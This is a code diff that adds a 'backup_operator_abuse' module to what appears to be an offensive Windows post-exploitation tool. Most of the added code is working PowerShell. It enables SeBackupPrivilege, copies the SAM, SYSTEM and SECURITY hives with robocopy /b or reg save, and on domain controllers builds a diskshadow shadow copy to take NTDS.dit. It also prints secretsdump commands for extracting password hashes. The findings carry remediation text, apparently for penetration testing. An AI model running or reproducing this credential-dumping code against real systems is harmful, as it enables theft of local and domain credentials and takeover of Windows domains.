@@ -458,6 +458,10 @@ msi_abuse: {
     description: "Windows Installer (MSI) privilege escalation — check AlwaysInstallElevated registry keys, craft malicious MSI packages with custom actions for SYSTEM execution, and exploit MSI repair abuse. AlwaysInstallElevated allows any user to install MSI packages with SYSTEM privileges",
     args: "--action check|craft|install [--payload CMD] [--output MSI_PATH]",
   },
+backup_operator_abuse: {
+    description: "Abuse Backup Operators group membership for privilege escalation — use backup privilege (SeBackupPrivilege) to read protected files including SAM/SYSTEM hives and NTDS.dit via robocopy /b, diskshadow, or wbadmin. Backup Operators can read any file on the system regardless of ACLs",
+    args: "--action check|dump_sam|dump_ntds [--outdir PATH] [--dc DC_HOSTNAME]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -16545,6 +16549,244 @@ if ($proc.ExitCode -eq 0) {
   return { output: output.join("\n"), findings }
 }
 
+async function backupOperatorAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const outdir = argVal(args, "--outdir") || "C:\\Windows\\Temp\\cs-backup"
+  const dc = argVal(args, "--dc")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Backup Operator Abuse — privilege escalation via SeBackupPrivilege\n"]
+
+  if (action === "check") {
+    const script = `
+# Check group membership
+$identity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object System.Security.Principal.WindowsPrincipal($identity)
+$groups = $identity.Groups | ForEach-Object {
+    try { $_.Translate([System.Security.Principal.NTAccount]).Value } catch { $_.Value }
+}
+
+$isBackupOp = $groups -contains 'BUILTIN\\Backup Operators'
+$isServerOp = $groups -contains 'BUILTIN\\Server Operators'
+
+Write-Output "[*] Current user: $($identity.Name)"
+Write-Output "[*] Backup Operators member: $isBackupOp"
+Write-Output "[*] Server Operators member: $isServerOp"
+Write-Output ""
+
+# Check privileges
+$privs = whoami /priv 2>$null
+$hasBackup = $privs -match 'SeBackupPrivilege'
+$hasRestore = $privs -match 'SeRestorePrivilege'
+Write-Output "[*] SeBackupPrivilege: $(if ($hasBackup) { 'PRESENT' } else { 'MISSING' })"
+Write-Output "[*] SeRestorePrivilege: $(if ($hasRestore) { 'PRESENT' } else { 'MISSING' })"
+Write-Output ""
+
+# Check if DC
+$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
+Write-Output "[*] Is Domain Controller: $isDC"
+
+if ($isBackupOp -or $hasBackup) {
+    Write-Output ""
+    Write-Output "[+] EXPLOITABLE — Backup privilege available"
+    Write-Output "    Available actions:"
+    Write-Output "      --action dump_sam    : Extract SAM/SYSTEM/SECURITY hives via robocopy /b"
+    if ($isDC) {
+        Write-Output "      --action dump_ntds   : Extract NTDS.dit via diskshadow + robocopy /b"
+    }
+} else {
+    Write-Output ""
+    Write-Output "[-] Not a Backup Operator and no SeBackupPrivilege"
+}
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    if (result.stdout.includes("EXPLOITABLE")) {
+      findings.push({
+        checkId: "WIN-BACKUP-OP-001",
+        provider: "windows",
+        severity: "high",
+        status: "VULNERABLE",
+        resource: "privilege://SeBackupPrivilege",
+        title: "Backup Operators privilege escalation possible",
+        details: "Current user has SeBackupPrivilege — can read any file regardless of ACLs",
+        remediation: "Remove user from Backup Operators group if not required. Monitor SeBackupPrivilege usage.",
+      })
+    }
+  } else if (action === "dump_sam") {
+    const script = `
+if (-not (Test-Path '${outdir}')) { New-Item -ItemType Directory -Path '${outdir}' -Force | Out-Null }
+
+Write-Output "[*] Enabling SeBackupPrivilege..."
+
+# Use Add-Type to enable the privilege programmatically
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+
+public class BackupPriv {
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
+
+    [DllImport("advapi32.dll", SetLastError = true)]
+    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,
+        ref TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct TOKEN_PRIVILEGES {
+        public int PrivilegeCount;
+        public long Luid;
+        public int Attributes;
+    }
+
+    public static bool EnablePrivilege(string privilege) {
+        IntPtr hToken;
+        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, 0x20 | 0x08, out hToken))
+            return false;
+
+        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
+        tp.PrivilegeCount = 1;
+        tp.Attributes = 2; // SE_PRIVILEGE_ENABLED
+        if (!LookupPrivilegeValue(null, privilege, out tp.Luid))
+            return false;
+
+        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
+    }
+}
+"@
+
+[BackupPriv]::EnablePrivilege("SeBackupPrivilege") | Out-Null
+Write-Output "[+] SeBackupPrivilege enabled"
+
+# Method 1: robocopy with backup flag
+Write-Output ""
+Write-Output "[*] Extracting SAM hive via robocopy /b..."
+$samSrc = "$env:SystemRoot\\System32\\config"
+robocopy $samSrc '${outdir}' SAM /b /np /r:0 /w:0 2>$null | Out-Null
+robocopy $samSrc '${outdir}' SYSTEM /b /np /r:0 /w:0 2>$null | Out-Null
+robocopy $samSrc '${outdir}' SECURITY /b /np /r:0 /w:0 2>$null | Out-Null
+
+# Check results
+$files = @("SAM", "SYSTEM", "SECURITY")
+foreach ($f in $files) {
+    $path = Join-Path '${outdir}' $f
+    if (Test-Path $path) {
+        $size = (Get-Item $path).Length
+        Write-Output "[+] Extracted: $f ($size bytes)"
+    } else {
+        Write-Output "[-] Failed: $f"
+        # Fallback: reg save
+        Write-Output "[*] Trying reg save fallback for $f..."
+        $hive = if ($f -eq "SAM") { "HKLM\\SAM" } elseif ($f -eq "SYSTEM") { "HKLM\\SYSTEM" } else { "HKLM\\SECURITY" }
+        reg save $hive "$path" /y 2>$null | Out-Null
+        if (Test-Path $path) {
+            Write-Output "[+] Extracted via reg save: $f"
+        }
+    }
+}
+
+Write-Output ""
+Write-Output "[+] Hives saved to: ${outdir}"
+Write-Output "[*] Crack offline: impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL"
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-BACKUP-OP-002",
+      provider: "windows",
+      severity: "critical",
+      status: "EXTRACTED",
+      resource: `file://${outdir}`,
+      title: "SAM/SYSTEM/SECURITY hives extracted via Backup privilege",
+      details: `Hives saved to ${outdir} — crack with secretsdump`,
+      remediation: "Remove user from Backup Operators. Delete extracted hives.",
+    })
+  } else if (action === "dump_ntds") {
+    const script = `
+if (-not (Test-Path '${outdir}')) { New-Item -ItemType Directory -Path '${outdir}' -Force | Out-Null }
+
+# Check if we're on a DC
+$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
+if (-not $isDC) {
+    Write-Output "[-] Not a Domain Controller — NTDS.dit only exists on DCs"
+    Write-Output "[*] Use --action dump_sam for local SAM extraction instead"
+    exit 1
+}
+
+Write-Output "[*] Domain Controller detected — extracting NTDS.dit"
+Write-Output ""
+
+# Method: diskshadow script
+$dshScript = @"
+set context persistent nowriters
+set metadata ${outdir}\\metadata.cab
+add volume c: alias cs_shadow
+create
+expose %cs_shadow% z:
+"@
+
+$scriptPath = "${outdir}\\diskshadow.txt"
+$dshScript | Out-File -FilePath $scriptPath -Encoding ASCII
+
+Write-Output "[*] Creating VSS shadow copy via diskshadow..."
+diskshadow /s $scriptPath 2>$null | Out-Null
+
+if (Test-Path "Z:\\") {
+    Write-Output "[+] Shadow copy exposed as Z:\\"
+    Write-Output "[*] Copying NTDS.dit via robocopy /b..."
+    robocopy "Z:\\Windows\\NTDS" '${outdir}' ntds.dit /b /np /r:0 /w:0 2>$null | Out-Null
+    robocopy "Z:\\Windows\\System32\\config" '${outdir}' SYSTEM /b /np /r:0 /w:0 2>$null | Out-Null
+
+    if (Test-Path "${outdir}\\ntds.dit") {
+        $size = (Get-Item "${outdir}\\ntds.dit").Length
+        Write-Output "[+] NTDS.dit extracted: $size bytes"
+    }
+    if (Test-Path "${outdir}\\SYSTEM") {
+        Write-Output "[+] SYSTEM hive extracted"
+    }
+
+    # Cleanup shadow
+    $cleanScript = @"
+delete shadows all
+exit
+"@
+    $cleanScript | Out-File -FilePath "${outdir}\\cleanup.txt" -Encoding ASCII
+    diskshadow /s "${outdir}\\cleanup.txt" 2>$null | Out-Null
+    Write-Output "[*] Shadow copy cleaned up"
+} else {
+    Write-Output "[-] diskshadow failed — trying wbadmin fallback..."
+    wbadmin start backup -backupTarget:'${outdir}' -include:C:\\Windows\\NTDS\\ntds.dit -quiet 2>$null
+}
+
+Write-Output ""
+Write-Output "[+] Files saved to: ${outdir}"
+Write-Output "[*] Extract hashes: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL"
+
+# Cleanup script file
+Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
+`
+    const result = await ps(script, timeout)
+    output.push(result.stdout)
+
+    findings.push({
+      checkId: "WIN-BACKUP-OP-003",
+      provider: "windows",
+      severity: "critical",
+      status: "EXTRACTED",
+      resource: `file://${outdir}/ntds.dit`,
+      title: "NTDS.dit extracted via Backup Operators privilege",
+      details: `NTDS.dit and SYSTEM hive saved to ${outdir}`,
+      remediation: "Remove user from Backup Operators on DCs. Monitor diskshadow/robocopy usage.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 const dispatch: Record<Program, (args: string[], timeout: number) => Promise<HookResult>> = {
   lsass_dump: lsassDump,
   sam_dump: samDump,
@@ -16640,6 +16882,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   server_operator_abuse: serverOperatorAbuse,
   dll_hijack: dllHijack,
   msi_abuse: msiAbuse,
+  backup_operator_abuse: backupOperatorAbuse,
 }
 
 export const WinhookTool = Tool.define("winhook", {
